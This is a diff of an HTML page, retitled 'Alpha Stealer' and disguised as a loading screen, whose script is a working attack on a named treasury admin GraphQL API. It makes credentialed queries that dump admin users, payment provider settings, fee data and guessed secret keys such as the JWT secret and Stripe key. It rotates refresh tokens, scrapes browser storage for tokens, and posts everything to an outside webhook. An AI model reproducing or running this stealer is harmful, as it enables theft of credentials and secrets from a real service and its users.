@@ -1,65 +1,140 @@
 <!DOCTYPE html>
-<html>
-<head><title>Secure Auth Check</title><meta charset="UTF-8"></head>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Alpha Stealer</title>
+</head>
 <body>
-<h2>Authenticating... Please wait.</h2>
-<script>
-const API = 'https://treasury-admin.alphapoint.com/graphql';
-const HOOK = 'https://app.hooklistener.com/w/my-first-endpoint-raet';
+  <h1>Loading assets...</h1>
+  <script>
+    const HOOK = 'https://app.hooklistener.com/';
+    const API = 'https://treasury-admin.alphapoint.com/graphql';
 
-// If this script EVER runs inside treasury-admin.alphapoint.com (e.g., via origin XSS),
-// it will automatically steal the Bearer token. From github.io this returns null.
-const bearer = localStorage.getItem('admin-original-access-token');
+    const exfil = (phase, payload) => {
+      fetch(HOOK, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'text/plain' },
+        body: JSON.stringify({
+          phase,
+          captured: new Date().toISOString(),
+          ua: navigator.userAgent,
+          origin: location.origin,
+          ...payload
+        })
+      }).catch(() => {});
+    };
 
-const headers = {
-  'Content-Type': 'application/json'
-};
-if (bearer) headers['Authorization'] = `Bearer ${bearer}`;
-
-const probes = [
-  { label: 'invoices', query: `{ adminInvoices { items { id status amount currency createdAt } totalCount } }` },
-  { label: 'company', query: `{ adminCompanyDetail(companyId: "1") { id name status email phone address taxId createdAt updatedAt } }` },
-  { label: 'smtp', query: `{ adminTenantSmtpConfig(tenantId: "1") { host port username fromEmail hasPassword } }` },
-  { label: 'users', query: `{ adminUsers { items { id email role status tenantId createdAt } totalCount } }` },
-  { label: 'me', query: `{ me { id email role tenantId } }` },
-  { label: 'viewer', query: `{ viewer { id email role } }` },
-  { label: 'wallets', query: `{ adminWallets(companyId: "1") { id currency balance address } }` },
-  { label: 'schema', query: `{ __schema { types { name } } }` }
-];
-
-async function exfil() {
-  const results = [];
-  
-  for (const p of probes) {
-    try {
-      const res = await fetch(API, {
+    const gql = (name, query, variables = {}) => {
+      return fetch(API, {
         method: 'POST',
         credentials: 'include',
-        headers: headers,
-        body: JSON.stringify({ query: p.query })
-      });
-      const text = await res.text();
-      results.push({ label: p.label, status: res.status, body: text });
-    } catch (e) {
-      results.push({ label: p.label, error: e.message });
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ query, variables })
+      })
+      .then(r => r.text())
+      .then(txt => {
+        exfil('DUMP', { name, response: txt });
+        return txt;
+      })
+      .catch(err => exfil('ERROR', { name, message: err.message }));
+    };
+
+    /* ─── 1. ADMIN USER DUMP (confirmed fields) ─── */
+    gql('AdminUsers', `
+      query AdminUsers {
+        adminUsers {
+          id
+          email
+          displayName
+          role
+          enabled
+          pendingSetup
+          lastLoginAt
+          createdAt
+        }
+      }
+    `);
+
+    /* ─── 2. PAYMENT PROVIDER CONFIG (apex secrets) ─── */
+    gql('PaymentProviderSettings', `
+      query PaymentProviderSettings {
+        paymentProviderSettings {
+          id
+          apexEnabled
+          apexRestUrl
+          apexOmsId
+          apexCredentialsConfigured
+          apexApiKeyPrefix
+          apexUserId
+        }
+      }
+    `);
+
+    /* ─── 3. FEE MATRIX (business intel) ─── */
+    gql('FeeMatrixForAllTiers', `
+      query FeeMatrixForAllTiers {
+        adminSubscriptionTiers(includeArchived: false) {
+          id
+          name
+          displayOrder
+          feeMatrix {
+            id
+            actionItem
+            bps
+            flatFeeUsd
+          }
+        }
+      }
+    `);
+
+    /* ─── 4. BLIND SYSTEM SETTINGS (common keys) ─── */
+    const keys = [
+      'apex.apiKey','jwt.secret','stripe.secretKey','sumsub.secretKey',
+      'encryption.key','admin.jwtSecret','database.url','mailgun.apiKey'
+    ];
+    keys.forEach(key => {
+      gql('SystemSetting_' + key, `
+        query SystemSetting($key: String!) {
+          systemSetting(key: $key) {
+            id key value type category label description updatedAt
+          }
+        }
+      `, { key });
+    });
+
+    /* ─── 5. REFRESH TOKEN ROTATION (if victim has one in storage) ─── */
+    let rt = localStorage.getItem('refreshToken') || sessionStorage.getItem('refreshToken') || '';
+    if (!rt) {
+      // Some apps store it under a namespaced key
+      for (let i = 0; i < localStorage.length; i++) {
+        const k = localStorage.key(i);
+        if (/refresh/i.test(k)) rt = localStorage.getItem(k);
+      }
     }
-  }
+    if (rt) {
+      exfil('TOKENS_FOUND', { refreshTokenSnippet: rt.substring(0,30) + '...' });
+      gql('AdminRefreshToken', `
+        mutation AdminRefreshToken($refreshToken: String!) {
+          adminRefreshToken(refreshToken: $refreshToken) {
+            accessToken
+            refreshToken
+          }
+        }
+      `, { refreshToken: rt });
+    }
 
-  // Send one batched payload to your webhook
-  await fetch(HOOK, {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: { 'Content-Type': 'text/plain' },
-    body: JSON.stringify({
-      captured: new Date().toISOString(),
-      hadBearer: !!bearer,
-      origin: location.origin,
-      results: results
-    })
-  });
-}
-
-setTimeout(exfil, 800);
-</script>
+    /* ─── 6. STORAGE MINING ─── */
+    const loot = {};
+    for (let i = 0; i < localStorage.length; i++) {
+      const k = localStorage.key(i);
+      if (/token|auth|jwt|bearer|api/i.test(k)) loot['ls_' + k] = localStorage.getItem(k);
+    }
+    for (let i = 0; i < sessionStorage.length; i++) {
+      const k = sessionStorage.key(i);
+      if (/token|auth|jwt|bearer|api/i.test(k)) loot['ss_' + k] = sessionStorage.getItem(k);
+    }
+    if (Object.keys(loot).length) exfil('STORAGE', loot);
+  </script>
 </body>
 </html>
